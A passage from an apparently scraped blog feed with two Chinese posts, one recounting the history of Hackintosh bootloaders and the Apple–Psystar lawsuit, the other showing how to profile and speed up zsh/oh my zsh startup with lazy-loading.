2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 